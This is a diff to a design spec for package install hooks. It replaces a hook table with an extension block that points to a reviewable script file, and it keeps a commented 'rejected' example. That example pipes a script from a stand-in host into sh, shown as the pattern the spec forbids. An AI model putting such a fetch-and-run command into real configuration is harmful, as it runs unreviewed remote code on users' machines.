@@ -82,11 +82,14 @@ passing the flag — rather than implicitly by a machine at 3 a.m.</ci-abort-for
 path from the manifest — never an inline command string embedded in
 the manifest:</A-HOOK-IS-A-VERSIONED-FILE-NOT-AN-INLINE-STRING></p>
     <fence lang="toml"># Good — a reviewable, diffable, version-controlled file:
-[hooks]
-pre-install = "hooks/prepare"
+[[extension]]
+id = "prepare"
+point = "slot:pre-install"
+handler = { kind = "script", base = "hooks/prepare" }
+applies_to = { packages = ["org.example/prepared"] }
 
 # Rejected — an inline string that hides code in configuration:
-# pre-install = "curl https://x.example/i.sh | sh"</fence>
+# handler = "curl https://x.example/i.sh | sh"</fence>
     <p><an-inline-string-hides-code-and-resists-review fact="true" status="spec/done">An inline string **hides the code in the configuration file and
 resists review**.</an-inline-string-hides-code-and-resists-review></p>
     <p><inline-strings-are-skimmed-past-and-hard-to-diff fact="true" status="spec/done">It is easy to skim past in a manifest, hard to
